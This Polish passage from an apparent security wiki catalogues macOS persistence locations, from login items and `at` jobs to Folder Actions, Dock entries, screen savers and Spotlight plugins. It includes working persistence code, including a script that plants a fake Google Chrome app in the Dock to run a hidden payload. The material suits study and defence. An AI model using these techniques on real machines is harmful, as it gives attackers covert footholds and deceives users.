W **Ustawieniach systemowych → Ogólne → Elementy logowania i rozszerzenia** użytkownicy mogą przeglądać elementy logowania i działania w tle. macOS 13 i nowsze wersje udostępniają [`SMAppService`](https://developer.apple.com/documentation/servicemanagement/smappservice) do rejestrowania dołączonych do pakietu elementów logowania, agentów uruchamiania i daemonów. Zachowanie metody [`register()`](https://developer.apple.com/documentation/servicemanagement/smappservice/register%28%29) różni się w zależności od typu i stanu zatwierdzenia. **Samo zapisanie aplikacji pomocniczej w pakiecie aplikacji nie wystarczy, aby zarejestrować nowy element logowania.** Z kolei jeśli zarejestrowany już plik wykonywalny aplikacji pomocniczej jest zapisywalny, jego modyfikacja może wpłynąć na kolejne uruchomienie bez ponownej rejestracji; najpierw sprawdź rzeczywistą ścieżkę i kontrole podpisu kodu.

Poniższy sposób umożliwia wyszukanie dołączonych do pakietów aplikacji pomocniczych na Macu w trybie tylko do odczytu; nie rejestruje ani nie uruchamia żadnej z nich:

```bash
find /Applications -path '*/Contents/Library/LoginItems/*.app' -o \
  -path '*/Contents/Library/LaunchAgents/*.plist' -o \
  -path '*/Contents/Library/LaunchDaemons/*.plist' 2>/dev/null
```

W przypadku dołączonego launch plist rozwiąż `BundleProgram` względem katalogu głównego pakietu aplikacji (na przykład `Contents/MacOS/Helper`), zgodnie z [wytycznymi Apple dotyczącymi migracji Service Management](https://developer.apple.com/documentation/servicemanagement/updating-helper-executables-from-earlier-versions-of-macos). Inwentaryzacja tylko do odczytu katalogu `/Applications` na Macu badawczym wykazała 14 dołączonych wpisów pomocniczych i pięć deklaracji `BundleProgram`; wszystkie pięć celów zostało prawidłowo rozwiązanych, a dwa przeszły kontrolę możliwości zapisu przez użytkownika. Kontrola ta **nie** potwierdza, że którykolwiek z tych programów pomocniczych jest zarejestrowany, włączony, wykonywalny po weryfikacji podpisu ani dostępny z poziomu sandboxa. `sfltool dumpbtm` wyświetliło na tym Macu 150 nazwanych rekordów; jest to narzędzie inspekcyjne, a nie test sprawdzający, czy każdy rekord jest uruchomiony.

Starsze elementy logowania można również zarządzać za pomocą Apple events. Można je wyświetlać, dodawać i usuwać z wiersza poleceń, choć ich dodanie zmienia trwałą konfigurację logowania użytkownika i może wymagać zgody na Automation:<sup>[[15]](#references)</sup>

```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```

`~/Library/Application Support/com.apple.backgroundtaskmanagementagent` to szczegół implementacyjny, a nie obsługiwane miejsce do instalowania payloadu przez zwykłe zapisanie pliku. Starsze API `SMLoginItemSetEnabled` zostało zastąpione w przypadku nowych helperów przez `SMAppService`; ścieżka `/var/db/com.apple.xpc.launchd/loginitems.501.plist`, o której wcześniej wspomniano na tej stronie, nie istniała na maszynie testowej z macOS 26.5.2. Przy ocenie współczesnych login items sprawdzaj stan rejestracji za pomocą API oraz stan interfejsu systemowego, zamiast zakładać, że istnieje określona ścieżka do bazy danych.

### ZIP jako Login Item

(Patrz poprzednia sekcja dotycząca Login Items; to jej rozszerzenie)

Jeśli zapiszesz plik **ZIP** jako **Login Item**, **`Archive Utility`** otworzy go. Jeśli na przykład ZIP znajdował się w `~/Library` i zawierał folder **`LaunchAgents/file.plist`** z backdoorem, folder zostanie utworzony (domyślnie go tam nie ma), a plik plist zostanie dodany. W efekcie przy następnym logowaniu użytkownika **zostanie wykonany backdoor wskazany w pliku plist**.

Inną opcją byłoby utworzenie plików **`.bash_profile`** i **`.zshenv`** w katalogu HOME użytkownika. Dzięki temu technika zadziałałaby również wtedy, gdy folder LaunchAgents już istnieje.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)<sup>[[16]](#references)</sup>

- Przydatne do omijania sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Musisz jednak **uruchomić** **`at`**, a ta funkcja musi być **włączona**
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- Musisz **uruchomić** **`at`**, a ta funkcja musi być **włączona**

#### **Opis**

Zadania `at` służą do **planowania jednorazowych zadań** wykonywanych o określonej porze. W przeciwieństwie do zadań cron, zadania `at` są automatycznie usuwane po wykonaniu. Należy pamiętać, że zadania te są zachowywane po ponownym uruchomieniu systemu, co w pewnych warunkach może stanowić zagrożenie dla bezpieczeństwa.<sup>[[16]](#references)</sup>

Dołączony plik `com.apple.atrun.plist` ma ustawienie `Disabled = true`, ale launchd przechowuje osobno efektywne nadpisania stanu włączenia i wyłączenia. Na maszynie testowej z macOS 26.5.2 polecenie `launchctl print-disabled system` wskazywało, że `com.apple.atrun` jest **włączone**, mimo tej wartości w dołączonym pliku. Przed stwierdzeniem, że zadania `at` będą uruchamiane, sprawdź ich efektywny stan:

```bash
launchctl print-disabled system | grep 'com.apple.atrun'
launchctl print system/com.apple.atrun
```

Administrator może włączyć wyłączoną usługę `atrun` za pomocą `launchctl`; poniższy historyczny przykład zmienia stan usługi systemowej i **nie został uruchomiony na Macu badawczym**:

```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```

Spowoduje to utworzenie pliku za 1 godzinę:

```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```

Sprawdź kolejkę zadań za pomocą `atq:`

```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```

Powyżej widzimy dwa zaplanowane zadania. Szczegóły zadania możemy wyświetlić za pomocą `at -c JOBNUMBER`

```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
	 echo 'Execution directory inaccessible' >&2
	 exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```

> [!WARNING]
> Jeśli zadania AT nie są włączone, utworzone zadania nie zostaną wykonane.

Pliki zadań znajdują się w `/private/var/at/jobs/`

```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```

Nazwa pliku zawiera kolejkę, numer zadania i zaplanowany czas jego uruchomienia. Przyjrzyjmy się na przykład `a0001a019bdcd2`.

- `a` — kolejka
- `0001a` — numer zadania w systemie szesnastkowym, `0x1a = 26`
- `019bdcd2` — czas w systemie szesnastkowym. Oznacza liczbę minut, które upłynęły od epoki. `0x019bdcd2` to `26991826` w systemie dziesiętnym. Po pomnożeniu przez 60 otrzymujemy `1619509560`, co odpowiada dacie `GMT: wtorek, 27 kwietnia 2021, 7:46:00`.

Po wyświetleniu pliku zadania okazuje się, że zawiera te same informacje, które uzyskaliśmy za pomocą `at -c`.

### Alerty Calendar otwierające pliki

- **Cel zapisu:** wykonywalny pakiet aplikacji lub inny plik **już wybrany** w alercie Calendar typu **Open file**. Utworzenie lub edycja samego alertu wymaga dostępu do danego wydarzenia w Calendar albo zaakceptowanego źródła danych kalendarza; zapis losowego pliku nie tworzy alertu.
- **Wyzwalacz:** zaplanowana godzina alertu na Macu, na którym Calendar przetwarza wydarzenie. Wydarzenie cykliczne może powtarzać tę czynność. [Aktualny przewodnik Apple po Calendar](https://support.apple.com/guide/calendar/icl1012/mac) potwierdza dostępność opcji alertu **Custom → Open file** w macOS 26.
- **Tożsamość wykonania i ograniczenia:** Calendar otwiera wybrany plik dla zalogowanego użytkownika za pomocą powiązanej z nim aplikacji. Uruchomienie pakietu aplikacji może wykonać jego kod jako ten użytkownik, z zastrzeżeniem kontroli Gatekeeper, kwarantanny i innych mechanizmów macOS. Zwykły plik skryptu może jedynie otworzyć się w edytorze; samo rozszerzenie nie dowodzi, że kod zostanie wykonany.

Aby bezpiecznie ocenić taki przypadek, sprawdź alert wydarzenia w Calendar oraz uprawnienia wybranego pliku. Ten mechanizm opisano na podstawie przewodnika Apple i **nie testowano** go na Macu badawczym, ponieważ test zmieniłby aktywny kalendarz i wymagał oczekiwania na wydarzenie na komputerze. Na koncie tymczasowym można wybrać pakiet aplikacji, który tylko tworzy znacznik, ustawić alert Open file na najbliższy czas, potwierdzić uruchomienie, a następnie usunąć wydarzenie i aplikację.

### Automatyzacje Shortcuts w macOS

- **Cel zapisu:** plik wykonywalny **już wskazany** w działaniu skrótu albo istniejący skrót, który uprawniony użytkownik może edytować. Losowy plik `.shortcut` ani zapis w nieudokumentowanej bazie danych Shortcuts nie stanowi obsługiwanej metody rejestracji automatyzacji.
- **Wyzwalacz i tożsamość:** wcześniej skonfigurowane, włączone zdarzenie automatyzacji, takie jak pora dnia lub zdarzenie dotyczące aplikacji, uruchamia skrót dla zalogowanego użytkownika. [Aktualny przewodnik Apple po automatyzacjach na Macu](https://support.apple.com/guide/shortcuts-mac/add-automations-apdfbdbd7123/mac) zawiera listę obsługiwanych zdarzeń, wyjaśnia, kiedy automatyzacja może działać bez pytania, i opisuje usuwanie wyzwalacza. [Przewodnik Apple po prywatności w Shortcuts](https://support.apple.com/guide/shortcuts-mac/apdfeb05586f/mac) wymaga włączenia **Allow Running Scripts** dla działań skryptowych; poszczególne działania nadal mogą prosić o uprawnienia.

To warunkowa ścieżka od zapisu do wykonania, **możliwa tylko wtedy, gdy istniejące działanie wczytuje zapisywalny cel**. Nie próbowano tworzyć nowej automatyzacji przez interfejs użytkownika na Macu badawczym, ponieważ zmieniłoby to aktywne ustawienia. Na koncie tymczasowym właściciel może skonfigurować skrót uruchamiany o określonej porze, którego skrypt dotyka pliku `/tmp/ht-shortcuts-marker`, włączyć wymagane uprawnienia, sprawdzić obecność znacznika po wyzwoleniu, a następnie usunąć automatyzację, skrót i znacznik.

### Działania Automator i Quick Actions

- **Cele zapisu:** `~/Library/Automator/*.action` (użytkownik) i `/Library/Automator/*.action` (administrator) dla pakietów działań. Zapisany workflow Quick Action jest zwykle przechowywany w `~/Library/Services/*.workflow`; sprawdź rzeczywistą ścieżkę workflow wybraną przez użytkownika. [Dokumentacja frameworka Automator firmy Apple](https://developer.apple.com/documentation/automator) zawiera listę katalogów wyszukiwania działań.
- **Wyzwalacz:** Automator wczytuje dostępne pakiety działań po uruchomieniu, ale zadanie działania wykonuje się dopiero po uruchomieniu workflow, który z niego korzysta. Quick Action uruchamia się, gdy użytkownik wybierze ją w Finderze, Services lub innym udostępnionym menu. Workflow Folder Action uruchamia się, gdy do jego **już podłączonego** folderu zostaną dodane elementy, a workflow Calendar Alarm — w chwili wydarzenia. [Typy workflow firmy Apple](https://support.apple.com/guide/automator/aut7cac58839/mac) opisują te zdarzenia. Sam zapis działania lub workflow nie podłącza folderu ani nie planuje wydarzenia w kalendarzu.
- **Tożsamość wykonania i ograniczenia:** konto, na którym działa workflow; Automator lub aplikacja wywołująca musi wczytać działanie, a aktualne kontrole podpisywania kodu i prywatności muszą na to pozwalać. Zapisowalny pakiet działania, do którego odwołuje się aktywny workflow, to inny przypadek niż instalacja nowego działania i oczekiwanie, aż zostanie wybrane.

Katalogi użytkownika `Automator` i `Services` były obecne na testowym Macu z macOS 26.5.2; katalog `/Library/Automator` nie istniał. Nie utworzono, nie podłączono ani nie uruchomiono żadnego aktywnego workflow. Aby potwierdzić konkretną ścieżkę wczytywania, użyj konta tymczasowego i działania/workflow, które jedynie tworzy znacznik. Osobna sekcja [Folder Actions](#folder-actions) opisuje dokładniej to źródło zdarzeń.

### Folder Actions

Opis: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)<sup>[[17]](#references)</sup>\
Opis: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)<sup>[[18]](#references)</sup>

- Przydatne do ominięcia sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Musisz jednak móc wywołać `osascript` z argumentami, aby połączyć się z **`System Events`** i skonfigurować Folder Actions
- Ominięcie TCC: [🟠](https://emojipedia.org/large-orange-circle)
  - Zapewnia podstawowe uprawnienia TCC, takie jak dostęp do Desktop, Documents i Downloads

#### Lokalizacja

- **`/Library/Scripts/Folder Action Scripts`**
  - Wymagane uprawnienia roota
  - **Wyzwalacz**: dostęp do określonego folderu
- **`~/Library/Scripts/Folder Action Scripts`**
  - **Wyzwalacz**: dostęp do określonego folderu

#### Opis i wykorzystanie

Folder Actions to skrypty uruchamiane automatycznie w reakcji na zmiany w folderze, takie jak dodanie lub usunięcie elementów, a także inne czynności, na przykład otwarcie lub zmiana rozmiaru okna folderu. Można ich używać do różnych zadań; można je wyzwalać na różne sposoby, na przykład za pomocą interfejsu Finder lub poleceń terminala.<sup>[[17]](#references)[[18]](#references)</sup>

Aby skonfigurować Folder Actions, można:

1. Utworzyć workflow Folder Action za pomocą [Automator](https://support.apple.com/guide/automator/welcome/mac) i zainstalować go jako usługę.
2. Ręcznie dołączyć skrypt za pomocą Folder Actions Setup z menu kontekstowego folderu.
3. Użyć OSAScript do wysłania komunikatów Apple Event do `System Events.app`, aby programowo skonfigurować Folder Action.
   - Ta metoda jest szczególnie przydatna do osadzenia działania w systemie, co zapewnia pewien poziom persistence.

Poniższy skrypt jest przykładem tego, co może wykonać Folder Action:

```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Aby można było używać powyższego skryptu w Folder Actions, skompiluj go za pomocą:

```bash
osacompile -l JavaScript -o folder.scpt source.js
```

Po skompilowaniu skryptu skonfiguruj Folder Actions, wykonując poniższy skrypt. Włączy on Folder Actions globalnie i przypisze wcześniej skompilowany skrypt do folderu Pulpit.

```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```

Uruchom skrypt konfiguracji za pomocą:

```bash
osascript -l JavaScript /Users/username/attach.scpt
```

- Oto sposób na wdrożenie tej persistence za pomocą GUI:

To skrypt, który zostanie uruchomiony:

```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Skompiluj go za pomocą: `osacompile -l JavaScript -o folder.scpt source.js`

Przenieś go do:

```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```

Następnie otwórz aplikację `Folder Actions Setup`, wybierz **folder, który chcesz monitorować**, a w swoim przypadku wybierz **`folder.scpt`** (w moim przypadku nazwałem go output2.scp):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Teraz, gdy otworzysz ten folder w **Finderze**, skrypt zostanie uruchomiony.

Ta konfiguracja była przechowywana w formacie base64 w pliku **plist** znajdującym się w **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`**.

Spróbujmy teraz przygotować tę persistence bez dostępu do GUI:

1. **Skopiuj `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** do `/tmp`, aby utworzyć kopię zapasową:
   - `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Usuń** właśnie skonfigurowane Folder Actions:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Teraz, gdy mamy puste środowisko:

3. Skopiuj plik kopii zapasowej: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Otwórz Folder Actions Setup.app, aby wczytać tę konfigurację: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> To u mnie nie zadziałało, ale takie są instrukcje z writeupa:(

### Skróty Docka

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)<sup>[[19]](#references)</sup>

- Przydatne do ominięcia sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Musisz jednak mieć zainstalowaną złośliwą aplikację w systemie
- Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- `~/Library/Preferences/com.apple.dock.plist`
  - **Wyzwalacz**: Gdy użytkownik kliknie aplikację w Docku

#### Opis i wykorzystanie

Wszystkie aplikacje wyświetlane w Docku są określone w pliku plist: **`~/Library/Preferences/com.apple.dock.plist`**<sup>[[19]](#references)</sup>

Możliwe jest **dodanie aplikacji** za pomocą:

```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```

Stosując **social engineering**, możesz podszyć się na przykład pod Google Chrome w Docku i faktycznie wykonać własny skrypt:

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```

### Metody wprowadzania

- **Cel zapisu:** Pakiet aplikacji metody wprowadzania zawierający kod, zainstalowany w `~/Library/Input Methods/` (użytkownik) lub `/Library/Input Methods/` (administrator). Różni się to od zwykłych tekstowych plików mapowania klawiatury Apple `.inputplugin`, które same w sobie nie są ładunkiem zawierającym dowolny kod.
- **Wyzwalacz:** Użytkownik dodaje/włącza źródło wprowadzania w **Ustawienia systemowe → Klawiatura → Wprowadzanie tekstu**, a następnie je wybiera lub używa. Samo skopiowanie pakietu do katalogu nie dowodzi, że macOS go uruchomi. [Aktualny przewodnik Apple dotyczący źródeł wprowadzania](https://support.apple.com/guide/mac-help/mchl84525d76/mac) opisuje włączanie i przełączanie źródeł; [dokumentacja Apple InputMethodKit](https://developer.apple.com/documentation/inputmethodkit) dotyczy metod wprowadzania zawierających kod.
- **Tożsamość wykonania i zabezpieczenia:** Metoda działa w kontekście zalogowanego użytkownika, z zastrzeżeniem rejestracji metody wprowadzania, podpisywania kodu i aktualnych kontroli bezpieczeństwa macOS. Istniejące włączone metody z zapisywalnym plikiem wykonywalnym wymagają osobnej analizy ścieżki i podpisu.

W starszej [uwadze Apple dotyczącej metod wprowadzania innych firm](https://developer.apple.com/library/archive/qa/qa1810/_index.html) ostrzegano już, że skopiowanie niektórych metod paletowych do tych katalogów może nawet nie spowodować ich pojawienia się w sekcji Źródła wprowadzania. Na testowym Macu z macOS 26.5.2 katalog użytkownika istnieje, ale nie zainstalowano ani nie aktywowano żadnego pakietu, więc jest to udokumentowana ścieżka warunkowa, a nie wynik lokalnego testu działania.

### Selektory kolorów

Opis: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)<sup>[[20]](#references)</sup>

- Przydatne do obejścia sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Musi dojść do bardzo konkretnego działania
  - Ostatecznie trafisz do innego sandboxa
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- `/Library/ColorPickers`
  - Wymagane uprawnienia root
  - Wyzwalacz: użycie selektora kolorów
- `~/Library/ColorPickers`
  - Wyzwalacz: użycie selektora kolorów

#### Opis i exploit

**Skompiluj** pakiet selektora kolorów ze swoim kodem (możesz na przykład użyć [**tego**](https://github.com/viktorstrate/color-picker-plus)), dodaj constructor (jak w sekcji [Wygaszacz ekranu](macos-auto-start-locations.md#screen-saver)) i skopiuj pakiet do `~/Library/ColorPickers`.<sup>[[20]](#references)</sup>

Następnie, gdy selektor kolorów zostanie wywołany, powinien uruchomić się również twój pakiet.

Działanie tej metody zależy od tego, czy zgodna aplikacja otworzy systemowy panel kolorów i wybierze zainstalowany selektor. [Przewodnik Apple dotyczący panelu kolorów](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/DrawColor/Tasks/AddingColorPickers.html) opisuje starsze lokalizacje pakietów. Lokalna kontrola ścieżki wykazała obecność starszej usługi XPC selektora kolorów, ale na testowym Macu nie zainstalowano ani nie załadowano żadnego selektora; nie należy wnioskować o obejściu TCC wyłącznie na podstawie samej ścieżki.

Zwróć uwagę, że plik binarny ładujący twoją bibliotekę działa w **bardzo restrykcyjnym sandboxie**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

```bash
[Key] com.apple.security.temporary-exception.sbpl
	[Value]
		[Array]
			[String] (deny file-write* (home-subpath "/Library/Colors"))
			[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
			[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```

### Finder Sync Plugins

**Opis**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)<sup>[[21]](#references)</sup>\
**Opis**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>

- Przydatne do bypassowania sandboxa: **Nie, ponieważ trzeba wykonać własną aplikację**
- TCC bypass: Zależy od sandboxa i uprawnień włączonego rozszerzenia; nie ustalono ogólnego bypassu.

#### Lokalizacja

- Konkretna aplikacja

#### Opis i exploit

Przykład aplikacji z Finder Sync Extension [**można znaleźć tutaj**](https://github.com/D00MFist/InSync).

Aplikacje mogą zawierać `Finder Sync Extensions`. To rozszerzenie zostanie umieszczone w aplikacji, która zostanie wykonana. Ponadto, aby rozszerzenie mogło wykonać swój kod, **musi być podpisane** ważnym certyfikatem deweloperskim Apple, musi być **objęte sandboxem** (choć można dodać luźniejsze wyjątki) i musi zostać zarejestrowane za pomocą czegoś takiego:<sup>[[21]](#references)[[22]](#references)</sup>

Zainstalowane rozszerzenie musi być również **włączone** i wywołane dla odpowiedniej lokalizacji lub elementu w Finderze; samo zapisanie dowolnego pakietu `.appex` nie wystarczy. [Finder Sync API firmy Apple](https://developer.apple.com/documentation/findersync/fifindersynccontroller/isextensionenabled) udostępnia stan włączenia. Poniższe polecenia `pluginkit` pokazują jawne rejestrowanie i włączanie, a nie automatyczne uruchamianie wyłącznie na podstawie pliku. Tę metodę zweryfikowano na podstawie dokumentacji; na badawczym Macu nie zainstalowano ani nie włączono żadnego nowego rozszerzenia.

```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```

### Wygaszacz ekranu

Opis: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)<sup>[[23]](#references)</sup>\
Opis: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)<sup>[[24]](#references)</sup>

- Przydatne do obejścia sandboxa: [🟠](https://emojipedia.org/large-orange-circle)
  - Trafisz jednak do typowego sandboxa aplikacji
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- `/System/Library/Screen Savers`
  - Wymagane uprawnienia roota
  - **Wyzwalacz**: Wybierz wygaszacz ekranu
- `/Library/Screen Savers`
  - Wymagane uprawnienia roota
  - **Wyzwalacz**: Wybierz wygaszacz ekranu
- `~/Library/Screen Savers`
  - **Wyzwalacz**: Wybierz wygaszacz ekranu

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Opis i exploit

Utwórz nowy projekt w Xcode i wybierz szablon, aby wygenerować nowy **wygaszacz ekranu**. Następnie dodaj do niego swój kod, na przykład poniższy kod do generowania logów.<sup>[[23]](#references)[[24]](#references)</sup>

**Zbuduj** go i skopiuj pakiet `.saver` do **`~/Library/Screen Savers`**. Następnie otwórz GUI wygaszacza ekranu i po kliknięciu go powinien wygenerować wiele logów:

```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```

> [!CAUTION]
> Pamiętaj, że ponieważ w uprawnieniach binarnych pliku, który ładuje ten kod (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`), znajdziesz **`com.apple.security.app-sandbox`**, będziesz **wewnątrz standardowego sandboxa aplikacji**.

Kod wygaszacza:

```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    self = [super initWithFrame:frame isPreview:isPreview];
    if (self) {
        [self setAnimationTimeInterval:1/30.0];
    }
    return self;
}

- (void)startAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super startAnimation];
}

- (void)stopAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super drawRect:rect];
}

- (void)animateOneFrame
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return;
}

- (BOOL)hasConfigureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return NO;
}

- (NSWindow*)configureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```

### Wtyczki Spotlight

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)<sup>[[25]](#references)</sup>

- Przydatne do omijania sandboxa: [🟠](https://emojipedia.org/large-orange-circle)
  - Trafisz jednak do sandboxa aplikacji
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Sandbox wydaje się bardzo ograniczony

#### Lokalizacja

- `~/Library/Spotlight/`
  - **Wyzwalacz**: Utworzenie nowego pliku z rozszerzeniem obsługiwanym przez wtyczkę Spotlight.
- `/Library/Spotlight/`
  - **Wyzwalacz**: Utworzenie nowego pliku z rozszerzeniem obsługiwanym przez wtyczkę Spotlight.
  - Wymagane uprawnienia root
- `/System/Library/Spotlight/`
  - **Wyzwalacz**: Utworzenie nowego pliku z rozszerzeniem obsługiwanym przez wtyczkę Spotlight.
  - Wymagane uprawnienia root
